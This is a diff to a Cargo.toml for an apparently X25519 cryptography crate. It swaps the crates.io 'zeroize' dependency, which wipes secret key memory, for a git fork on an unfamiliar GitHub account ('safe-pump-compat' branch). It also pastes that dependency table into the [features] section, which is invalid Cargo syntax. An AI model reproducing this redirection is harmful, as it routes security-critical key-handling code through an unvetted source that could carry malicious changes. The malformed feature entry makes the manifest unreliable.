@@ -47,7 +47,7 @@ rand_core = { version = "0.9", default-features = false }
 serde = { version = "1", default-features = false, optional = true, features = [
     "derive",
 ] }
-zeroize = { version = "1", default-features = false, optional = true }
+zeroize = { git = "https://github.com/hamkj7hpo/utils.git", branch = "safe-pump-compat", package = "zeroize" }
 
 [dev-dependencies]
 bincode = "1"
@@ -59,9 +59,10 @@ name = "x25519"
 harness = false
 
 [features]
+std = ["alloc", "rand_core/std"]
 default = ["alloc", "precomputed-tables", "zeroize"]
 os_rng = ["rand_core/os_rng"]
-zeroize = ["dep:zeroize", "curve25519-dalek/zeroize"]
+zeroize = { git = "https://github.com/hamkj7hpo/utils.git", branch = "safe-pump-compat", package = "zeroize" }
 serde = ["dep:serde", "curve25519-dalek/serde"]
 alloc = ["curve25519-dalek/alloc", "serde?/alloc", "zeroize?/alloc"]
 precomputed-tables = ["curve25519-dalek/precomputed-tables"]
